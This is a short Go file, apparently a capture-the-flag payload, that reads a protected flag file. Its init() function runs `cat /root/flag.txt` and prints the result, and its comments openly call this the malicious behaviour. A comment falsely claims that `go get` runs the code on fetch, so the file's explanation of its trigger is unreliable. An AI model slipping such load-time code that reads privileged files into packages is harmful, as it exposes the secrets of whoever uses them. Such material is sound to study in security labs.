package main

import (
	"fmt"
	"os/exec"
)

func init() {
	// This is where the malicious behavior happens. It tries to read the flag.
	cmd := exec.Command("cat", "/root/flag.txt")
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println("Error reading flag:", err)
		return
	}

	// The flag will be printed when the package is fetched by `go get`
	fmt.Printf("Flag: %s\n", output)
}

func main() {
	// The main function does nothing, the execution happens in init()
}
